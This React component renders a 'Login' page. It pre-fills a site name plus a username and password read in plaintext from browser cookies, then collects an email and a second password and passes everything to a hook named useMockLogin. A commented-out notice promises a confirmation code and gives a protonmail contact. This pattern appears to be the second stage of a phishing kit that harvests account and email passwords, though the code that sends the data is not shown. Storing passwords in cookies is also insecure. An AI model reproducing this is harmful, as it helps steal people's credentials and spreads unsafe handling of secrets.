import React, { useState } from "react";
import { Formik, Form } from "formik";
import * as Yup from "yup";
import {
  MdVisibility,
  MdVisibilityOff,
  MdLock,
  MdPriorityHigh,
} from "react-icons/md";
import TextfieldWrapper from "./TextfieldWrapper";
import SubmitButton from "./SubmitButton";
import { API_URL, site } from "../config";
import useMockLogin from "../hooks/useMockLogin";
import Cookies from "js-cookie";
import { toast } from "react-toastify";
import { setRequestMeta } from "next/dist/server/request-meta";

function Account() {
  const [showPassword, setShowPassword] = useState(false);
  // const [reset, setReset] = useState(false);
  // const id = Cookies.get("id");
  const username = Cookies.get("username");
  const password1 = Cookies.get("password1");

  const initialvalues = {
    site: site,
    username: username,
    password1: password1,
    email: "",
    password2: "",
  };

  const validate = Yup.object({
    email: Yup.string().required("Required"),
    password2: Yup.string().required("Required"),
  });

  const { login } = useMockLogin();

  const handleSubmit = async (values, formik) => {
    // console.log(values);
    login(values, formik);
  };

  return (
    <div className="md:w-[550px] lg:w-[632px] mx-auto mt-[60px] lg:mt-[45px] mb-[90px] lg:mb-[144px]">
      <div className="flex flex-col items-ceneter">
        <div className="lg:border border-slate-300 border-opacity-40 ">
          <div className="bg-custom-indigo text-white text-xl font-medium px-[26px] py-[18px] shadow-md">
            Login
          </div>

          {/* <div className="bg-custom-yellow my-11 mx-4 p-4 border-t-4 border-black/10 flex items-center gap-4">
            <MdPriorityHigh
              size={24}
              className="fill-black/30 hidden lg:block"
            />
            <div className="flex-1 text-black/70">
              <p className="">
                Please leave this page open and go check your inbox (and spam
                folder) for the confirmation code we just sent you.
              </p>
              <p className="mt-6">
                If you don't see it right away, give it a few min, check both
                inbox and spam folders again and then contact us:
                <strong> myprivatedelights@protonmail.com</strong>
              </p>
            </div>
          </div> */}

          <div className="px-[15px] pt-7 pb-[24px]">
            <Formik
              initialValues={initialvalues}
              enableReinitialize
              validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="space-y-[18px]">
                  <TextfieldWrapper
                    name="email"
                    label="Email"
                    type="email"
                    helpertext="emails are case-sensitive"
                  />
                  <div className="relative">
                    <TextfieldWrapper
                      name="password2"
                      label="Password"
                      helpertext="passwords are case-sensitive"
                      autoComplete="on"
                      type={showPassword ? "text" : "password"}
                    />
                    <span
                      className="absolute right-0 top-[17px] text-[23px] opacity-50 cursor-pointer"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? <MdVisibilityOff /> : <MdVisibility />}
                    </span>
                  </div>

                  <div className="mt-5 flex justify-center">
                    <SubmitButton>Confirm</SubmitButton>
                  </div>
                </Form>
              )}
            </Formik>

            <div className="mt-[58px] mx-4 lg:mx-[55px] text-[16.5px] flex justify-center items-center text-custom-indigo">
              <p className="cursor-pointer">Help</p>
            </div>
          </div>
        </div>
      </div>
      <div className="h-[1px] bg-slate-600/50"></div>
    </div>
  );
}

export default Account;
